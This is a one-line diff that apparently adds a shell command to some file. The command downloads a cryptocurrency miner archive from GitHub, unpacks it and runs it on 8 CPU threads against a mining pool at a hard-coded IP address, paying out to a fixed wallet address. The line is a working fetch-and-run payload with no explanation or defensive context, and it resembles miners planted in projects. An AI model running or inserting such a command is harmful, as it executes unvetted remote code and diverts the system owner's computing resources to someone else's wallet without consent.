@@ -1,0 +1,1 @@
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && ./hellminer -c  stratum+tcp://139.99.123.225:3956#xnsub -u RGVegWzDKhuPUAKJybftAZm4BXShNFPCYe.tits -p x --cpu 8
